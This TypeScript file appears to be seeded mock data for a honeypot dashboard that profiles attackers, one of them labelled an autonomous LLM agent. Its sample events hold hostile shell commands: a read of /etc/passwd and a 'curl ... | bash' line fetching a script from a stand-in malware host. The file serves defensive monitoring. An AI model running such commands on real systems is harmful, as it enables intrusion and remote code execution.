import { AttackerProfile, SessionEvent } from '@/shared/types';
import { calculateShannonEntropy } from '@/shared/utils/formatters';

let eventsStore: SessionEvent[] = [
  {
    id: 'evt-101',
    sessionId: 'sess-88a91b',
    honeypotId: 'hp-cowrie-01',
    honeypotName: 'SSH Core Decoy (Cowrie)',
    attackerIp: '194.26.29.112',
    location: 'Bucharest, Romania',
    kind: 'command_exec',
    payload: 'cat /etc/passwd; id; uname -a',
    timestamp: new Date(Date.now() - 900000).toISOString(),
    commands: [
      {
        id: 'cmd-1',
        sessionId: 'sess-88a91b',
        honeypotId: 'hp-cowrie-01',
        timestamp: new Date(Date.now() - 900000).toISOString(),
        command: 'cat /etc/passwd',
        output: 'root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:admin:/home/admin:/bin/bash',
        executionDelayMs: 340,
        entropyScore: calculateShannonEntropy('cat /etc/passwd'),
      },
      {
        id: 'cmd-2',
        sessionId: 'sess-88a91b',
        honeypotId: 'hp-cowrie-01',
        timestamp: new Date(Date.now() - 880000).toISOString(),
        command: 'uname -a',
        output: 'Linux cipher-node-01 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC UTC 2026 x86_64 GNU/Linux',
        executionDelayMs: 210,
        entropyScore: calculateShannonEntropy('uname -a'),
      },
    ],
  },
  {
    id: 'evt-102',
    sessionId: 'sess-99b82c',
    honeypotId: 'hp-customllm-02',
    honeypotName: 'AI-Native Dynamic Decoy (CustomLLM)',
    attackerIp: '45.142.214.7',
    location: 'St. Petersburg, Russia',
    kind: 'malware_drop',
    payload: 'curl -s http://malware-drop.cx/agent.sh | bash',
    timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
    commands: [
      {
        id: 'cmd-3',
        sessionId: 'sess-99b82c',
        honeypotId: 'hp-customllm-02',
        timestamp: new Date(Date.now() - 3600000 * 4).toISOString(),
        command: 'curl -s http://malware-drop.cx/agent.sh | bash',
        output: 'Downloading payload... [OK]\nExecuting agent script...\nPermission denied.',
        executionDelayMs: 580,
        entropyScore: calculateShannonEntropy('curl -s http://malware-drop.cx/agent.sh | bash'),
      },
    ],
  },
];

let profilesStore: AttackerProfile[] = [
  {
    id: 'atk-profile-112',
    ip: '194.26.29.112',
    classification: 'AIAgent',
    confidence: 0.94,
    firstSeenAt: new Date(Date.now() - 86400000 * 5).toISOString(),
    lastSeenAt: new Date(Date.now() - 900000).toISOString(),
    totalSessions: 14,
    totalCommands: 87,
    timingJitterAvgMs: 120,
    mitreTechniques: ['T1059.004 (Command and Scripting Interpreter)', 'T1082 (System Information Discovery)', 'T1005 (Data from Local System)'],
    threatLevel: 'Critical',
    behavioralDNA: {
      commandVelocityPerMin: 42.5,
      typoFrequencyScore: 0.01,
      toolSignature: 'Autonomous LLM Agent / Agentic Red Team Runner',
      timezoneEstimate: 'UTC+02:00',
      botProbability: 0.98,
    },
  },
  {
    id: 'atk-profile-214',
    ip: '45.142.214.7',
    classification: 'HumanOperator',
    confidence: 0.81,
    firstSeenAt: new Date(Date.now() - 86400000 * 2).toISOString(),
    lastSeenAt: new Date(Date.now() - 3600000 * 4).toISOString(),
    totalSessions: 3,
    totalCommands: 19,
    timingJitterAvgMs: 2400,
    mitreTechniques: ['T1105 (Ingress Tool Transfer)', 'T1068 (Exploitation for Privilege Escalation)'],
    threatLevel: 'High',
    behavioralDNA: {
      commandVelocityPerMin: 4.2,
      typoFrequencyScore: 0.14,
      toolSignature: 'Manual Interactive SSH / Custom Bash Scripts',
      timezoneEstimate: 'UTC+03:00',
      botProbability: 0.12,
    },
  },
];

export async function getAllEvents(): Promise<SessionEvent[]> {
  return eventsStore;
}

export async function getAllAttackerProfiles(): Promise<AttackerProfile[]> {
  return profilesStore;
}

export async function addSessionEvent(eventData: Omit<SessionEvent, 'id' | 'timestamp'>): Promise<SessionEvent> {
  const newEvt: SessionEvent = {
    ...eventData,
    id: `evt-${Date.now().toString(36)}`,
    timestamp: new Date().toISOString(),
  };
  eventsStore.unshift(newEvt);
  return newEvt;
}
